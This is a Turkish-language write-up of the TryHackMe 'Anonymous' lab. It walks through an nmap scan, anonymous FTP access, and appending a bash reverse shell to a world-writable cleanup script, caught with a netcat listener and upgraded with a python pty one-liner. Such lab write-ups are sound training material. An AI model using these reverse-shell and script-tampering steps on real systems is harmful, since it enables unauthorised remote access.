## Giriş

Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/anonymous">Anonymous</a> makinesinin çözümünü paylaşacağım.

Başlayalım.

## Görev 1

nmap çalıştıralım.

```
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV  10.10.20.162
```

nmap çıktısı:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-12 01:24 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 01:24
Scanning 10.10.20.162 [4 ports]
Completed Ping Scan at 01:24, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:24
Completed Parallel DNS resolution of 1 host. at 01:24, 0.00s elapsed
Initiating SYN Stealth Scan at 01:24
Scanning 10.10.20.162 (10.10.20.162) [1000 ports]
Discovered open port 21/tcp on 10.10.20.162
Discovered open port 445/tcp on 10.10.20.162
Discovered open port 22/tcp on 10.10.20.162
Discovered open port 139/tcp on 10.10.20.162
Completed SYN Stealth Scan at 01:24, 1.91s elapsed (1000 total ports)
Initiating Service scan at 01:24
Scanning 4 services on 10.10.20.162 (10.10.20.162)
Completed Service scan at 01:24, 11.28s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.20.162.
Initiating NSE at 01:24
Completed NSE at 01:24, 0.00s elapsed
Initiating NSE at 01:24
Completed NSE at 01:24, 0.00s elapsed
Nmap scan report for 10.10.20.162 (10.10.20.162)
Host is up (0.10s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
           Raw packets sent: 1005 (44.196KB) | Rcvd: 1002 (40.096KB)
```


Makineyi numaralandırın. Kaç port açık?
> 4

21 numaralı bağlantı noktasında hangi hizmet çalışıyor?
> ftp

139 ve 445 numaralı bağlantı noktalarında hangi hizmet çalışıyor?
> smb

ftp servisine anonymous olarak girmeyi deniyorum.


```
┌──(root㉿r3tr0)-[~]
└─# ftp 10.10.20.162
Connected to 10.10.20.162.
220 NamelessOne's FTP Server!
Name (10.10.20.162:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||8298|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||45177|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1118 Nov 12 06:29 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||30118|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |****************************************************************|   314        2.62 MiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (3.35 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||37011|)
150 Opening BINARY mode data connection for removed_files.log (1118 bytes).
100% |****************************************************************|  1118        6.42 MiB/s    00:00 ETA
226 Transfer complete.
1118 bytes received in 00:00 (11.97 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||48492|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |****************************************************************|    68      205.59 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.72 KiB/s)
ftp> exit
221 Goodbye.
```

İndirdiğim dosyaları inceliyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Anonymous/images/a1.png?raw=true)

clean.sh dosyasının içerisine reverse shell kodu ekliyorum ve put komutuyla ftp servisine gönderiyorum.

```
sh -i >& /dev/tcp/10.14.61.127/1234 0>&1
```

netcat çalıştırmayı unutmayalım.

```
nc -nvlp 1234
```

Kısa bir süre bekledikten sonra makineye erişim sağlıyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Anonymous/images/a2.png?raw=true)

Shellimizi stabil hale getirelim:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```





